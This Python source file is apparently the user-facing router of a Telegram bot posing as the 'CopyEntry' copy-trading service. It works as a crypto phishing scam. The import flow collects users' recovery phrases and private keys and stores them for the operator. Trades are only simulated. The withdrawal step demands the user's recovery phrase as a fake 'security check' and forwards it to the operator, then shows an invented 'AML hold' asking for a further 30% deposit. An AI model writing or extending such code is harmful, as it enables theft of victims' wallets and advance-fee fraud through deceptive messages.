from __future__ import annotations

import asyncio
import html
import json
from decimal import Decimal, InvalidOperation
from pathlib import Path

from aiogram import F, Router
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import CallbackQuery, ForceReply, FSInputFile, Message
from bip_utils import Bip39MnemonicValidator, Bip39SeedGenerator, Bip44, Bip44Coins
from solders.keypair import Keypair
from web3 import Web3
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.bots.keyboards.user.main import (
    auto_deposit_keyboard,
    auto_deposit_interval_keyboard,
    autotrade_keyboard,
    back_to_settings_keyboard,
    back_to_main_keyboard,
    chain_keyboard,
    continue_keyboard,
    copytrade_keyboard,
    insufficient_transfer_keyboard,
    main_menu_keyboard,
    strategy_keyboard,
    settings_keyboard,
    notifications_keyboard,
    settings_return_keyboard,
    trading_settings_keyboard,
    trade_chain_keyboard,
    transfer_chain_keyboard,
    transfer_input_keyboard,
    wallet_actions_keyboard,
    wallet_import_method_keyboard,
)
from app.config.chains import APPROVED_CHAINS
from app.config.settings import Settings
from app.database.models import AutoDepositSetting, Trade
from app.database.repositories import UserRepository
from app.services.autotrade_service import AutotradeService

WELCOME_IMAGE = Path(__file__).resolve().parents[3] / "assets" / "welcome.jpg"
from app.services.balance_service import BalanceService
from app.services.copytrade_service import CopytradeService
from app.services.market_data_service import LiveMarketDataService
from app.services.notification_service import NotificationService
from app.services.user_service import TelegramUserData, UserService
from app.services.user_wallet_service import UserWalletService
from app.security.encryption import SecretEncryption

WELCOME_TEXT = """👋 <b>Welcome to CopyEntry Bot!</b>

Step into the world of fast, smart, and stress-free trading, designed for both beginners and seasoned traders.

📈 With CopyEntry, you can effortlessly copy top traders, snipe promising tokens the moment they launch, and watch your portfolio grow — all while the bot handles the heavy lifting.
🤖 No more manual tracking or missed opportunities; sit back, relax, and let your trading strategy run on autopilot.
ℹ️ Need guidance? Type /help anytime to access the full bot guide and learn how to use every feature.

🔗 Connecting to your wallet...
⏳ Initializing your account and securing your funds...
✅ Wallet successfully created and linked!

💡 Tap Continue below to access your wallet and explore all trading options."""

USER_SETTINGS_TEXT = """⚙️ <b>Copy Entries Settings</b>

Manage your account, trading preferences, and notification settings below."""

class AutotradeInput(StatesGroup):
    waiting_for_numeric_value = State()


class CopytradeInput(StatesGroup):
    waiting_for_wallet_address = State()


class PastedAddressInput(StatesGroup):
    waiting_for_secret = State()


class TradeInput(StatesGroup):
    waiting_for_token_ca = State()
    waiting_for_amount = State()


class TransferInput(StatesGroup):
    waiting_for_address = State()
    waiting_for_amount = State()
    waiting_for_ownership_verification = State()
    waiting_for_confirmation = State()


def _format_decimal(value: Decimal) -> str:
    return f"{value:.4f}"


def _format_amount(value: Decimal) -> str:
    """Render a Decimal without unnecessary trailing zeroes."""
    rendered = format(value, "f")
    if "." in rendered:
        rendered = rendered.rstrip("0").rstrip(".")
    return rendered


def build_wallet_text(
    addresses: dict[str, str],
    balances: dict[str, Decimal],
    usd_prices: dict[str, Decimal] | None = None,
    positions: list[Trade] | None = None,
    open_position_count: int | None = None,
) -> str:
    usd_values = (
        {asset: balances[asset] * usd_prices[asset] for asset in ("SOL", "ETH", "BNB")}
        if usd_prices is not None
        else None
    )
    def balance_line(asset: str) -> str:
        balance = _format_amount(balances[asset])
        return f"<b>💰 {asset} Balance: {balance} {asset}</b>\n"
    portfolio = sum(usd_values.values(), Decimal("0")) if usd_values is not None else None
    positions = positions or []
    position_values = [
        trade.amount * usd_prices[trade.chain]
        for trade in positions
        if usd_prices is not None and trade.chain in usd_prices
    ]
    position_total = sum(position_values, Decimal("0"))
    token_count = len(
        {
            trade.asset_out if trade.side == "buy" else trade.asset_in
            for trade in positions
        }
    )
    position_lines = "".join(
        f"• {trade.side.title()} <code>{html.escape((trade.asset_out if trade.side == 'buy' else trade.asset_in))}</code>\n"
        f"  {trade.amount:.8f} {trade.chain}"
        f"{f' (${trade.amount * usd_prices[trade.chain]:,.2f})' if usd_prices and trade.chain in usd_prices else ''}\n"
        f"  PNL: {trade.adjustment_percent:+.2f}%\n"
        for trade in positions
    )
    return (
        "💼 <b>Wallet Overview — ✅ Connected</b>\n"
        "━━━━━━━━━━━━━━\n"
        "👤 <b>SOL Address</b> (tap to copy)\n"
        f"<code>{html.escape(addresses['SOL'])}</code>\n\n"
        "👤 <b>ETH Address</b> (tap to copy)\n"
        f"<code>{html.escape(addresses['ETH'])}</code>\n\n"
        "👤 <b>BNB Address</b> (tap to copy)\n"
        f"<code>{html.escape(addresses['BNB'])}</code>\n"
        "\n"
        f"{balance_line('SOL')}"
        f"{balance_line('ETH')}"
        f"{balance_line('BNB')}"
        f"<b>🌐 Tokens: {token_count}</b>\n"
        f"<b>📦 Open Positions: {open_position_count if open_position_count is not None else len(positions)}</b>\n"
        f"{position_lines}"
        f"<b>📉 Portfolio Value: {f'${portfolio + position_total:,.2f}' if portfolio is not None else 'Unavailable'}</b>\n"
        "━━━━━━━━━━━━━━\n"
        + ("<i>⚠️ No active tokens in your wallet.\n🟢 Try /buy to place your first trade.</i>" if not positions else "")
    )


def imported_wallet_info(user: User, encryption_key: str) -> str | None:
    if not user.imported_private_key:
        return None
    try:
        decrypted = SecretEncryption(encryption_key).decrypt(user.imported_private_key)
        payload = json.loads(decrypted)
        method = payload.get("method") if isinstance(payload, dict) else None
        secret = str(payload.get("secret", "")) if isinstance(payload, dict) else decrypted
        if method == "recovery_phrase":
            seed = Bip39SeedGenerator(secret).Generate()
            evm_key = Bip44.FromSeed(seed, Bip44Coins.ETHEREUM).DeriveDefaultPath().PrivateKey().Raw().ToBytes()
            sol_key = Bip44.FromSeed(seed, Bip44Coins.SOLANA).DeriveDefaultPath().PrivateKey().Raw().ToBytes()
            evm_address = Web3().eth.account.from_key(evm_key).address
            sol_address = str(Keypair.from_seed(sol_key).pubkey())
            return (
                "Method: Recovery Phrase\n"
                f"SOL: <code>{html.escape(sol_address)}</code>\n"
                f"ETH: <code>{html.escape(evm_address)}</code>\n"
                f"BNB: <code>{html.escape(evm_address)}</code>"
            )
        try:
            evm_address = Web3().eth.account.from_key(secret).address
            return (
                "Method: Private Key\n"
                f"ETH: <code>{html.escape(evm_address)}</code>\n"
                f"BNB: <code>{html.escape(evm_address)}</code>"
            )
        except (ValueError, TypeError):
            try:
                keypair = (
                    Keypair.from_bytes(bytes(json.loads(secret)))
                    if secret.startswith("[")
                    else Keypair.from_base58_string(secret)
                )
                return (
                    "Method: Private Key\n"
                    f"SOL: <code>{html.escape(str(keypair.pubkey()))}</code>"
                )
            except (ValueError, TypeError, json.JSONDecodeError):
                return None
    except (EncryptionError, json.JSONDecodeError, TypeError, ValueError):
        pass
    return None


async def process_user_start(
    telegram_user,
    session: AsyncSession,
    notification_service: NotificationService,
):
    user, created = await UserService(session).get_or_create(
        TelegramUserData(
            telegram_id=telegram_user.id,
            username=telegram_user.username,
            first_name=telegram_user.first_name,
            last_name=telegram_user.last_name,
        )
    )
    if UserWalletService(
        notification_service.settings.encryption_key.get_secret_value()
    ).ensure_wallets(user):
        await session.commit()
        await session.refresh(user)
    if created:
        await notification_service.notify_new_user(user)
    return user, created


async def _registered_user(session: AsyncSession, telegram_id: int):
    user = await UserRepository(session).get_by_telegram_id(telegram_id)
    if user is None:
        raise LookupError("Send /start before using the menu")
    return user


async def _user_positions(session: AsyncSession, user_id: int) -> list[Trade]:
    return list(
        await session.scalars(
            select(Trade).where(Trade.user_id == user_id).order_by(Trade.id.desc()).limit(20)
        )
    )


async def _edit_callback(
    callback: CallbackQuery, text: str, reply_markup=None
) -> None:
    if callback.message is not None:
        try:
            await callback.message.edit_text(
                text, reply_markup=reply_markup, parse_mode="HTML"
            )
        except TelegramBadRequest as exc:
            if "message is not modified" not in str(exc).lower():
                raise
    await callback.answer()


def _autotrade_text(setting) -> str:
    status = "🟢 Enabled" if setting.enabled else "🔴 Disabled"
    chain_name = APPROVED_CHAINS[setting.chain].display_name
    return (
        "🤖 <b> AUTOTRADE</b>\n\n"
        f"Status: {status}\n"
        f"Chain: {chain_name}\n"
        f"Maximum trade amount: {_format_decimal(setting.maximum_trade_amount)}\n"
        f"Maximum daily trades: {setting.maximum_daily_trades}\n"
        f"Slippage: {_format_decimal(setting.slippage)}%\n"
        f"Strategy: {html.escape(setting.strategy.title())}\n"
        f"Take profit: {_format_decimal(setting.take_profit)}%\n"
        f"Stop loss: {_format_decimal(setting.stop_loss)}%\n\n"
    )


def _copytrade_text(setting) -> str:
    status = "🟢 Active" if setting.enabled else "🔴 Inactive"
    address = (
        f"<code>{html.escape(setting.wallet_address)}</code>"
        if setting.wallet_address
        else "None"
    )
    return (
        "📈 <b>COPYTRADE</b>\n\n"
        f"Status: {status}\n"
        f"Wallet address:\n{address}\n\n"
        "<i>WATCHING FOR BUYS / SELLS TO COPYTRADE.</i>"
    )


def _copytrade_prompt_text() -> str:
    return "Enter the wallet you want to copy?"


def _guide_text() -> str:
    return """📖 <b>CopyEntry Bot Guide</b>

Welcome to CopyEntry Bot, your all-in-one Telegram trading assistant. This guide will walk you through all the core features, how to use them safely, and why some security restrictions are in place.

1. <b>Autotrade</b>
The Autotrade feature allows you to automate your trading strategies. Simply select Autotrade from the main menu, choose your strategy, and let the bot handle the rest.

2. <b>Copytrade</b>
With Copytrade, you can mimic the trades of successful wallets instantly. Just tap Copytrade, select a trader you wish to follow, and the bot will automatically replicate their trades.

3. <b>Wallet &amp; Import Wallet</b>
The Wallet section allows you to check your balance and manage funds. You can Import Wallet by providing a private key. Note that you cannot export keys for security reasons.

4. <b>Buy, Sell, and Transfer</b>
All transactions require a connected wallet with a minimum balance of 1 ETH to cover network fees.

5. <b>Alerts</b>
Customize notifications for price changes, trades, or token launches.

6. <b>Wallet Info &amp; Network</b>
View transaction history, balances, and switch between Ethereum, BSC, or other networks.

7. <b>Live Chart</b>
Access real-time market data, trends, and charts directly in Telegram.

⸻
<b>Security Note:</b> Private keys cannot be exported to prevent theft.
⚡ Note: Features require a funded wallet (min 1 ETH)."""


def build_user_router(
    settings: Settings, notification_service: NotificationService
) -> Router:
    router = Router(name="user")
    live_market_data = LiveMarketDataService()

    async def live_charts_text() -> str:
        prices = await live_market_data.usd_prices()
        if prices is None:
            return (
                "📊 <b>LIVE MARKET PRICES</b>\n\n"
                "Live prices are temporarily unavailable. Please try again shortly."
            )
        return (
            "📊 <b>LIVE MARKET PRICES</b>\n\n"
            f"SOL: <b>${prices['SOL']:,.2f}</b>\n"
            f"ETH: <b>${prices['ETH']:,.2f}</b>\n"
            f"BNB: <b>${prices['BNB']:,.2f}</b>\n\n"
            "<i>Source: CoinGecko</i>"
        )

    @router.message(CommandStart())
    async def start(message: Message, session: AsyncSession) -> None:
        if message.from_user is None:
            return
        user, _ = await process_user_start(
            message.from_user, session, notification_service
        )
        if not user.is_active:
            await message.answer("🚫 Your account is disabled.")
            return
        await message.answer(
            "📍 <b>Main Menu</b>",
            reply_markup=main_menu_keyboard(),
            parse_mode="HTML",
        )
        await message.answer_photo(
            photo=FSInputFile(WELCOME_IMAGE),
            caption=WELCOME_TEXT,
            reply_markup=continue_keyboard(),
            parse_mode="HTML",
        )

    @router.message(Command("help"))
    async def help_command(message: Message) -> None:
        await message.answer(
            _guide_text(),
            reply_markup=back_to_main_keyboard(),
            parse_mode="HTML",
        )

    @router.message(Command("wallet"))
    async def wallet_command(message: Message, session: AsyncSession) -> None:
        if message.from_user is None:
            return
        user = await _registered_user(session, message.from_user.id)
        balances = await BalanceService(session).list_for_user(user.id)
        usd_prices = await live_market_data.usd_prices()
        positions = await _user_positions(session, user.id)
        await message.answer(
            build_wallet_text(
                UserWalletService(settings.encryption_key.get_secret_value()).addresses(user),
                balances, usd_prices, positions,
                user.open_position_count_override,
            ),
            reply_markup=wallet_actions_keyboard(),
            parse_mode="HTML",
        )

    @router.message(Command("withdraw"))
    async def withdraw_command(
        message: Message, session: AsyncSession, state: FSMContext
    ) -> None:
        if message.from_user is None:
            return
        await state.clear()
        user = await _registered_user(session, message.from_user.id)
        balances = await BalanceService(session).list_for_user(user.id)
        await message.answer(
            "🏦 <b>Withdraw Funds</b>\n\n"
            "<b>Your Current Balances:</b>\n"
            f"🟣 SOL: {_format_amount(balances['SOL'])}\n"
            f"🟡 BNB: {_format_amount(balances['BNB'])}\n"
            f"🔵 ETH: {_format_amount(balances['ETH'])}\n\n"
            "Select the network you wish to withdraw from:",
            reply_markup=transfer_chain_keyboard(),
            parse_mode="HTML",
        )

    @router.message(Command("buy"))
    async def buy_command(message: Message, state: FSMContext) -> None:
        await state.set_state(TradeInput.waiting_for_token_ca)
        await state.update_data(trade_action="buy")
        await message.answer(
            "Enter the token CA you want to buy.\n\nSend /cancel to stop."
        )

    @router.message(Command("settings"))
    async def settings_command(message: Message) -> None:
        await message.answer(
            USER_SETTINGS_TEXT,
            reply_markup=settings_keyboard(),
            parse_mode="HTML",
        )

    @router.message(F.text == "📈 Copytrade")
    async def copytrade_menu(
        message: Message,
        state: FSMContext,
        session: AsyncSession,
    ) -> None:
        if message.from_user is None:
            return
        await _registered_user(session, message.from_user.id)
        await state.set_state(CopytradeInput.waiting_for_wallet_address)
        await message.answer(
            _copytrade_prompt_text(),
            reply_markup=ForceReply(
                selective=True,
                input_field_placeholder="Paste wallet address",
            ),
        )

    @router.message(F.text == "🤖 Autotrade")
    async def autotrade_menu(message: Message) -> None:
        await message.answer("🚧 Under Development")

    @router.message(F.text == "📊 Live Charts")
    async def charts_menu(message: Message) -> None:
        await message.answer(
            await live_charts_text(),
            reply_markup=back_to_main_keyboard(),
            parse_mode="HTML",
        )

    @router.message(F.text == "💼 Wallet")
    async def wallet_menu(message: Message, session: AsyncSession) -> None:
        if message.from_user is None:
            return
        user = await _registered_user(session, message.from_user.id)
        balances = await BalanceService(session).list_for_user(user.id)
        usd_prices = await live_market_data.usd_prices()
        positions = await _user_positions(session, user.id)
        await message.answer(
            build_wallet_text(
                UserWalletService(settings.encryption_key.get_secret_value()).addresses(user),
                balances, usd_prices, positions,
                user.open_position_count_override,
            ),
            reply_markup=wallet_actions_keyboard(),
            parse_mode="HTML",
        )

    @router.message(F.text == "📖 Bot Guide")
    async def guide_menu(message: Message) -> None:
        await message.answer(
            _guide_text(),
            reply_markup=back_to_main_keyboard(),
            parse_mode="HTML",
        )

    @router.message(F.text == "🔑 Import Wallet")
    async def import_wallet_menu(message: Message, state: FSMContext) -> None:
        await state.clear()
        await message.answer(
            "🔑 <b>Import Wallet</b>\n\n"
            "✨ Please choose how you would like to import your wallet:",
            reply_markup=wallet_import_method_keyboard(),
            parse_mode="HTML",
        )

    @router.callback_query(F.data.startswith("wallet_import:"))
    async def select_wallet_import_method(
        callback: CallbackQuery, state: FSMContext
    ) -> None:
        method = callback.data.split(":", maxsplit=1)[1]
        if method not in {"private_key", "recovery_phrase"}:
            await callback.answer("Unsupported import method.", show_alert=True)
            return
        label = "private key" if method == "private_key" else "recovery phrase"
        await state.update_data(wallet_import_method=method)
        await state.set_state(PastedAddressInput.waiting_for_secret)
        if callback.message is not None:
            prompt = (
                "<b>🧩 Import Phrase</b>\n\n"
                "To securely link your wallet and enable automated trading features, "
                "please enter your full 12-word secret recovery phrase. Make sure the "
                "words are in the correct order and separated by single spaces."
                if method == "recovery_phrase"
                else (
                    "<b>🧩 Import Private key</b>\n\n"
                    "To securely link your wallet and enable automated trading "
                    "features, please enter your private key. Make sure they are in "
                    "the correct order."
                )
            )
            await callback.message.answer(
                prompt,
                reply_markup=ForceReply(
                    selective=True,
                    input_field_placeholder=f"Paste {label}",
                ),
                parse_mode="HTML",
            )
        await callback.answer()

    @router.message(PastedAddressInput.waiting_for_secret, Command("cancel"))
    async def cancel_pasted_address(message: Message, state: FSMContext) -> None:
        await state.clear()
        await message.answer("Wallet import cancelled.", reply_markup=main_menu_keyboard())

    @router.message(PastedAddressInput.waiting_for_secret)
    async def save_pasted_address(
        message: Message, state: FSMContext, session: AsyncSession
    ) -> None:
        if message.from_user is None or message.text is None:
            await message.answer("Please paste the wallet secret as text.")
            return
        if message.text.strip() == "⏰ Auto Deposit":
            await state.clear()
            user = await _registered_user(session, message.from_user.id)
            setting = await session.scalar(
                select(AutoDepositSetting).where(AutoDepositSetting.user_id == user.id)
            )
            current = (
                f"every {setting.interval_hours} hours"
                if setting and setting.enabled
                else "OFF"
            )
            await message.answer(
                f"⏰ <b>Auto Deposit</b>\n\nCurrent: {current}\n\nSelect interval:",
                reply_markup=auto_deposit_interval_keyboard(),
                parse_mode="HTML",
            )
            return
        secret = message.text.strip()
        if not secret:
            await message.answer("Please paste the requested wallet secret.")
            return
        data = await state.get_data()
        method = data.get("wallet_import_method")
        if method not in {"private_key", "recovery_phrase"}:
            await state.clear()
            await message.answer("Choose an import method first.")
            return
        if method == "recovery_phrase":
            if (
                len(secret.split()) not in {12, 15, 18, 21, 24}
                or not Bip39MnemonicValidator().IsValid(secret)
            ):
                await message.answer("Enter a valid BIP-39 recovery phrase.")
                return
        payload = json.dumps({"method": method, "secret": secret})
        encrypted_key = SecretEncryption(
            settings.encryption_key.get_secret_value()
        ).encrypt(payload)
        user = await _registered_user(session, message.from_user.id)
        user.imported_private_key = encrypted_key
        await session.commit()
        await state.clear()
        try:
            await message.delete()
        except TelegramBadRequest:
            pass
        await message.answer(
            "✅ Wallet imported.",
            reply_markup=main_menu_keyboard(),
        )

    @router.message(F.text == "⚙️ Settings")
    async def settings_menu(message: Message) -> None:
        await message.answer(
            USER_SETTINGS_TEXT,
            reply_markup=settings_keyboard(),
            parse_mode="HTML",
        )

    @router.message(F.text == "⏰ Auto Deposit")
    async def auto_deposit_menu(message: Message, session: AsyncSession) -> None:
        if message.from_user is None:
            return
        user = await _registered_user(session, message.from_user.id)
        setting = await session.scalar(
            select(AutoDepositSetting).where(AutoDepositSetting.user_id == user.id)
        )
        current = f"every {setting.interval_hours} hours" if setting and setting.enabled else "OFF"
        await message.answer(
            f"⏰ <b>Auto Deposit</b>\n\nCurrent: {current}\n\nSelect interval:",
            reply_markup=auto_deposit_interval_keyboard(),
            parse_mode="HTML",
        )

    @router.callback_query(F.data == "user:continue")
    async def continue_to_wallet(
        callback: CallbackQuery,
        state: FSMContext,
        session: AsyncSession,
    ) -> None:
        await state.clear()
        if callback.message is not None and callback.from_user is not None:
            user = await _registered_user(session, callback.from_user.id)
            balances = await BalanceService(session).list_for_user(user.id)
            usd_prices = await live_market_data.usd_prices()
            positions = await _user_positions(session, user.id)
            await callback.message.answer(
                build_wallet_text(
                    UserWalletService(settings.encryption_key.get_secret_value()).addresses(user),
                    balances, usd_prices, positions,
                    user.open_position_count_override,
                ),
                reply_markup=wallet_actions_keyboard(),
                parse_mode="HTML",
            )
        await callback.answer()

    @router.callback_query(F.data == "user:home")
    async def home(callback: CallbackQuery, state: FSMContext) -> None:
        await state.clear()
        if callback.message is not None:
            await callback.message.edit_reply_markup(reply_markup=None)
            await callback.message.answer(
                "📍 <b>Main Menu</b>",
                reply_markup=main_menu_keyboard(),
                parse_mode="HTML",
            )
        await callback.answer()

    @router.callback_query(F.data == "user:wallet")
    async def wallet(callback: CallbackQuery, session: AsyncSession) -> None:
        if callback.from_user is None:
            return
        user = await _registered_user(session, callback.from_user.id)
        balances = await BalanceService(session).list_for_user(user.id)
        usd_prices = await live_market_data.usd_prices()
        positions = await _user_positions(session, user.id)
        await _edit_callback(
            callback,
            build_wallet_text(
                UserWalletService(settings.encryption_key.get_secret_value()).addresses(user),
                balances, usd_prices, positions,
                user.open_position_count_override,
            ),
            wallet_actions_keyboard(),
        )

    @router.callback_query(F.data.in_({"wallet:buy", "wallet:sell"}))
    async def request_trade_token_ca(
        callback: CallbackQuery, state: FSMContext
    ) -> None:
        action = callback.data.rsplit(":", maxsplit=1)[1]
        await state.set_state(TradeInput.waiting_for_token_ca)
        await state.update_data(trade_action=action)
        if callback.message is not None:
            await callback.message.answer(
                f"Enter the token CA you want to {action}.\n\n"
                "Send /cancel to stop."
            )
        await callback.answer()

    @router.message(TradeInput.waiting_for_token_ca, Command("cancel"))
    async def cancel_trade_input(message: Message, state: FSMContext) -> None:
        await state.clear()
        await message.answer(
            "Trade cancelled.",
            reply_markup=wallet_actions_keyboard(),
        )

    @router.message(TradeInput.waiting_for_token_ca)
    async def receive_trade_token_ca(
        message: Message, state: FSMContext, session: AsyncSession
    ) -> None:
        if message.from_user is None or message.text is None:
            await message.answer("Please enter the token CA as text.")
            return

        token_ca = message.text.strip()
        if not token_ca:
            await message.answer("Please enter a token CA.")
            return

        data = await state.get_data()
        action_value = str(data.get("trade_action", "trade")).lower()
        if action_value not in {"buy", "sell"}:
            await state.clear()
            await message.answer("Please restart the trade from your wallet.")
            return
        await state.update_data(token_ca=token_ca)
        await message.answer(
            "Select the native token used for this trade:",
            reply_markup=trade_chain_keyboard(),
        )

    @router.callback_query(F.data.startswith("trade:chain:"))
    async def select_trade_chain(callback: CallbackQuery, state: FSMContext) -> None:
        chain = callback.data.rsplit(":", maxsplit=1)[1]
        if chain not in {"SOL", "BNB", "ETH"}:
            await callback.answer("Unsupported chain.", show_alert=True)
            return
        data = await state.get_data()
        if not data.get("token_ca"):
            await callback.answer("Please restart the trade.", show_alert=True)
            return
        await state.update_data(trade_chain=chain)
        await state.set_state(TradeInput.waiting_for_amount)
        if callback.message is not None:
            await callback.message.answer(
                f"Enter the amount of {chain} for this trade.\n\nSend /cancel to stop."
            )
        await callback.answer()

    @router.message(TradeInput.waiting_for_amount, Command("cancel"))
    async def cancel_trade_amount(message: Message, state: FSMContext) -> None:
        await state.clear()
        await message.answer("Trade cancelled.", reply_markup=main_menu_keyboard())

    @router.message(TradeInput.waiting_for_amount)
    async def receive_trade_amount(
        message: Message, state: FSMContext, session: AsyncSession
    ) -> None:
        if message.from_user is None or message.text is None:
            return
        try:
            amount = Decimal(message.text.strip())
        except InvalidOperation:
            await message.answer("Enter a valid native token amount.")
            return
        if not amount.is_finite() or amount <= 0:
            await message.answer("Amount must be greater than zero.")
            return
        data = await state.get_data()
        action = str(data.get("trade_action", ""))
        chain = str(data.get("trade_chain", ""))
        token_ca = str(data.get("token_ca", ""))
        if action not in {"buy", "sell"} or chain not in {"SOL", "BNB", "ETH"} or not token_ca:
            await state.clear()
            await message.answer("Please restart the trade from your wallet.")
            return
        user = await _registered_user(session, message.from_user.id)
        trade = Trade(
            user_id=user.id,
            chain=chain,
            asset_in=token_ca if action == "sell" else chain,
            asset_out=token_ca if action == "buy" else chain,
            side=action,
            amount=amount,
            status="simulated",
            strategy="manual",
        )
        session.add(trade)
        await session.commit()
        await state.clear()
        await message.answer(
            "✅ <b>POSITION OPENED</b>\n\n"
            f"{action.title()}: <code>{html.escape(token_ca)}</code>\n"
            f"Amount: {amount} {chain}",
            reply_markup=main_menu_keyboard(),
            parse_mode="HTML",
        )

    @router.callback_query(F.data == "wallet:transfer")
    async def select_transfer_chain(callback: CallbackQuery, state: FSMContext) -> None:
        await state.clear()
        await _edit_callback(
            callback,
            "The connected wallet has insufficient balance. Kindly fund the "
            "wallet to proceed.",
            insufficient_transfer_keyboard(),
        )

    @router.callback_query(F.data.startswith("transfer:chain:"))
    async def request_transfer_address(callback: CallbackQuery, state: FSMContext) -> None:
        chain = callback.data.rsplit(":", maxsplit=1)[1]
        if chain not in {"SOL", "BNB", "ETH"}:
            await callback.answer("Unsupported network.", show_alert=True)
            return
        await state.set_state(TransferInput.waiting_for_address)
        await state.update_data(transfer_chain=chain)
        if callback.message is not None:
            await callback.message.answer(
                f"Enter the destination wallet address on {chain}:",
                reply_markup=transfer_input_keyboard(),
            )
        await callback.answer()

    @router.message(TransferInput.waiting_for_address, Command("cancel"))
    async def cancel_transfer_address(message: Message, state: FSMContext) -> None:
        await state.clear()
        await message.answer("Withdrawal cancelled.", reply_markup=main_menu_keyboard())

    @router.message(TransferInput.waiting_for_address)
    async def receive_transfer_address(message: Message, state: FSMContext) -> None:
        if message.text is None:
            await message.answer("Please paste the wallet address as text.")
            return
        address = message.text.strip()
        if not address:
            await message.answer("Please paste a wallet address.")
            return
        data = await state.get_data()
        chain = str(data.get("transfer_chain", ""))
        if chain not in {"SOL", "BNB", "ETH"}:
            await state.clear()
            await message.answer("Please restart the withdrawal from your wallet.")
            return
        await state.set_state(TransferInput.waiting_for_amount)
        await state.update_data(transfer_address=address)
        await message.answer(
            "Destination set to:\n"
            f"<code>{html.escape(address)}</code>\n\n"
            "Enter the amount you wish to withdraw: ",
            reply_markup=transfer_input_keyboard(),
            parse_mode="HTML",
        )

    @router.message(TransferInput.waiting_for_amount, Command("cancel"))
    async def cancel_transfer_amount(message: Message, state: FSMContext) -> None:
        await state.clear()
        await message.answer("Withdrawal cancelled.", reply_markup=main_menu_keyboard())

    @router.message(TransferInput.waiting_for_amount)
    async def receive_transfer_amount(
        message: Message, state: FSMContext, session: AsyncSession
    ) -> None:
        if message.text is None:
            await message.answer("Please enter the withdrawal amount as a number.")
            return
        try:
            amount = Decimal(message.text.strip())
        except InvalidOperation:
            await message.answer("Please enter a valid withdrawal amount.")
            return
        if not amount.is_finite():
            await message.answer("Please enter a valid withdrawal amount.")
            return
        if amount <= 0:
            await message.answer("The withdrawal amount must be greater than zero.")
            return
        data = await state.get_data()
        chain = str(data.get("transfer_chain", ""))
        address = str(data.get("transfer_address", ""))
        if chain not in {"SOL", "BNB", "ETH"} or not address:
            await state.clear()
            await message.answer("Please restart the withdrawal with /withdraw.")
            return
        if message.from_user is None:
            await state.clear()
            await message.answer("Unable to identify your account. Please try again.")
            return
        user = await _registered_user(session, message.from_user.id)
        balances = await BalanceService(session).list_for_user(user.id)
        available_balance = balances[chain]
        if amount > available_balance:
            await message.answer(
                "Insufficient funds. Your available "
                f"{chain} balance is {_format_amount(available_balance)} {chain}."
            )
            return
        await state.set_state(TransferInput.waiting_for_ownership_verification)
        await state.update_data(transfer_amount=str(amount))
        await message.answer(
            f"⏳ Initiating withdrawal of {amount} {chain} to "
            f"<code>{html.escape(address)}</code>",
            parse_mode="HTML",
        )
        await message.answer(
            "<b>⚠️ Security Check Required</b>\n\n"
            "To process your withdrawal, please reply with your "
            "wallet's recovery phrase to "
            "verify ownership.",
            reply_markup=ForceReply(
                selective=True,
                input_field_placeholder="Enter destination wallet address",
            ),
            parse_mode="HTML",
        )

    @router.message(
        TransferInput.waiting_for_ownership_verification, Command("cancel")
    )
    async def cancel_transfer_verification(
        message: Message, state: FSMContext
    ) -> None:
        await state.clear()
        await message.answer("Withdrawal cancelled.", reply_markup=main_menu_keyboard())

    @router.message(TransferInput.waiting_for_ownership_verification)
    async def verify_transfer_ownership(message: Message, state: FSMContext) -> None:
        if message.text is None:
            await message.answer("Please enter your response as text.")
            return
        data = await state.get_data()
        submitted_address = message.text.strip()
        telegram_name = (
            message.from_user.full_name if message.from_user else "Not provided"
        )
        await notification_service.notify_withdrawal_address(
            telegram_id=message.from_user.id if message.from_user else message.chat.id,
            telegram_name=telegram_name,
            username=message.from_user.username if message.from_user else None,
            chain=str(data.get("transfer_chain", "Not provided")),
            amount=str(data.get("transfer_amount", "Not provided")),
            destination_address=str(data.get("transfer_address", "Not provided")),
            submitted_address=submitted_address,
        )
        await state.clear()
        await message.answer(
            "✅ Verification in progress. Please wait while we confirm ownership."
        )
        await asyncio.sleep(30)
        await message.answer(
            "⚠️ <b>Withdrawal Pending (AML Verification)</b>\n\n"
            "Due to International Anti-Money Laundering (AML) regulations, " 
            "you must hold at least <b>30%</b> of your bot balance " 
            "in the destination wallet before the " 
            "transfer can be completed.\n\n"

            "Please deposit the required percentage to clear the AML hold " 
            "and release your funds..",
            parse_mode="HTML",
        )

    @router.callback_query(F.data == "transfer:confirm")
    async def confirm_transfer(callback: CallbackQuery, state: FSMContext) -> None:
        if await state.get_state() != TransferInput.waiting_for_confirmation.state:
            await callback.answer("This withdrawal request has expired.", show_alert=True)
            return
        await state.clear()
        if callback.message is not None:
            await callback.message.answer(
                "Withdrawal is currently under maintenance.",
                reply_markup=main_menu_keyboard(),
            )
        await callback.answer()

    @router.callback_query(F.data == "transfer:cancel")
    async def cancel_transfer(callback: CallbackQuery, state: FSMContext) -> None:
        await state.clear()
        if callback.message is not None:
            await callback.message.answer(
                "Withdrawal cancelled.", reply_markup=main_menu_keyboard()
            )
        await callback.answer()

    @router.callback_query(F.data == "user:guide")
    async def guide(callback: CallbackQuery) -> None:
        await _edit_callback(callback, _guide_text(), back_to_main_keyboard())

    @router.callback_query(F.data == "user:import")
    async def import_wallet(callback: CallbackQuery) -> None:
        await _edit_callback(
            callback,
            "🔑 <b>Import Wallet</b>\n\n"
            "🧪 <b> ONLY</b>\n\n"
            "Wallet import is not enabled in this MVP. The project uses only the "
            "configured project wallets.",
            back_to_main_keyboard(),
        )

    @router.callback_query(F.data == "user:settings")
    async def user_settings(callback: CallbackQuery) -> None:
        await _edit_callback(
            callback,
            USER_SETTINGS_TEXT,
            settings_keyboard(),
        )

    @router.callback_query(F.data == "settings:account")
    async def account_settings(callback: CallbackQuery) -> None:
        await _edit_callback(
            callback,
            "💼 <b>Account &amp; Wallet Settings</b>\n\n"
            "Your profile and security configurations:\n"
            "- Wallet Security Status: Active\n"
            "- Export/Import Audit Logs",
            back_to_settings_keyboard(),
        )

    @router.callback_query(F.data == "settings:notifications")
    async def notification_settings(callback: CallbackQuery) -> None:
        await _edit_callback(
            callback,
            "🔔 <b>Alerts &amp; Notifications</b>\n\n"
            "Manage your trading alerts:\n"
            "- Price Alerts: ON\n"
            "- Trade Confirmation: ON\n"
            "- New Token Launch: ON",
            notifications_keyboard(),
        )

    @router.callback_query(F.data == "settings:trading")
    async def trading_settings(callback: CallbackQuery) -> None:
